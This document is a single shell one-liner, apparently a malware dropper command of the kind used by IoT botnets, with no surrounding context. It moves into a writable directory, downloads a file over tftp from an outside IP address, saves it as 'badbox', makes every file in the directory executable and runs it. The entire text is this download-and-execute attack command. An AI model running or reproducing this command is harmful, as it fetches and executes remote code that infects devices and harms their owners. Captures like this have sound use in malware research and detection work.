cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.166.101 -c get bash;cat bash >badbox;chmod +x *;./badbox
